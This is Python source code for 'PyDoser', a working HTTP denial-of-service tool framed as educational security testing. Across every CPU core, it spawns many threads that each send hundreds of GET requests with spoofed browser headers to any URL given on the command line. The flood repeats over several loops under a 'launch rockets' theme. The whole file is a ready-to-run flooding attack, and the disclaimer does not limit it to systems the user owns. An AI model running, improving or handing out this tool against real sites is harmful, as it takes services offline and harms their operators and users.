"""
Disclaimer:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! 
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. 
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.

PyDoser is a Python 3 app for testing security side of your web apps
PyDoser is a HTTP DoS tool

More: https://github.com/dominon12/PyDoser
"""
import requests
import argparse
import random
import multiprocessing
import threading
import concurrent.futures
from fake_headers import Headers
import time
from datetime import datetime


__all__ = ('Doser',)


class Doser:
	"""Main class"""

	def __init__(self, args):
		self.args = args

	def _start_processes(self):
		"""Starts processes and waits 
		untill they will stop their work.
		"""
		num_cores = multiprocessing.cpu_count()
		processes = [
			multiprocessing.Process(
							target=self._start_threads, 
							args=(self.args, p_num, self._send_requests)
							)
			for p_num in range(num_cores)
		]		
		[process.start() for process in processes]
		if self.args.debug:
			print(f'{datetime.now().time()} | Ran {num_cores} processes')
		[process.join() for process in processes]
		if self.args.debug:
			print(f'{datetime.now().time()} | All the processes were stopped')

	@staticmethod
	def _start_threads(args, p_num: int, _send_requests):
		"""Starts threads and waits u
		ntill they will stop their work.
		"""
		threads = [
			threading.Thread(
						target=_send_requests, 
						args=(p_num, t_num)
						) 
			for t_num in range(int(args.threads_num))
		]
		[thread.start() for thread in threads]
		if args.debug:
			print(f'{datetime.now().time()} | Ran {args.threads_num} threads in process #{p_num}')
		[thread.join() for thread in threads]
		if args.debug:
			print(f'{datetime.now().time()} | Threads in process #{p_num} were stopped')

	def _send_requests(self, p_num: int, t_num: int):
		"""Sends requests to a target url"""
		headers = Headers(headers=True).generate()
		try:
			[requests.get(self.args.url, headers=headers) for i in range(int(self.args.requests_num))]
		except Exception as e:
			exception_name = e.__class__.__name__
			if self.args.debug:
				print(f'{datetime.now().time()} | Can\'t reach target url: {exception_name}')
		if self.args.debug:
			print(f'{datetime.now().time()} | Process #{p_num}; Thread: {t_num}; {self.args.requests_num} requests have been sent')

	def launch_rockets(self):
		"""Activates doser mechanism"""
		print('██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗███████╗██████╗░')
		print('██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗')
		print('██████╔╝░╚████╔╝░██║░░██║██║░░██║╚█████╗░█████╗░░██████╔╝')
		print('██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║░╚═══██╗██╔══╝░░██╔══██╗')
		print('██║░░░░░░░░██║░░░██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║')
		print('╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝')
		if self.args.debug:
			print(f'{datetime.now().time()} | 3...')
		time.sleep(1)
		if self.args.debug:
			print(f'{datetime.now().time()} | 2...')
		time.sleep(1)
		if self.args.debug:	
			print(f'{datetime.now().time()} | 1...')
		time.sleep(1)
		if self.args.debug:
			print(f'{datetime.now().time()} | LAUNCH!!1')
		for i in range(int(args.loops_num)):
			if self.args.debug:
				print('--------------------------------------------------------')
				print(f'---------------------STARTING LOOP #{i}-------------------')
				print('--------------------------------------------------------')
			self._start_processes()
		print(f'{datetime.now().time()} | All the rockets reached their targets!')


if __name__ == '__main__':
	# set up args parser
	parser = argparse.ArgumentParser(description='PyDoser')
	parser.add_argument(
				'-u', '--url', 
				help='Target url', 
				default='http://127.0.0.1:8000/'
			)
	parser.add_argument(
				'-l', '--loops_num', 
				help='Number of loops', 
				default=5
			)
	parser.add_argument(
				'-th', '--threads_num', 
				help='Number of threads in every process', 
				default=30
			)
	parser.add_argument(
				'-r', '--requests_num',
				help='Number of requests in every single thread',
				default=500
			)
	parser.add_argument(
				'-d', '--debug',
				help='If True, shows logs',
				default=False
			)
	args = parser.parse_args()
	try:
		doser = Doser(
				args=args
			)
		doser.launch_rockets()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f'{datetime.now().time()} | An error occured:\n{e}')
	finally:
		print(f'{datetime.now().time()} | Loop ended')











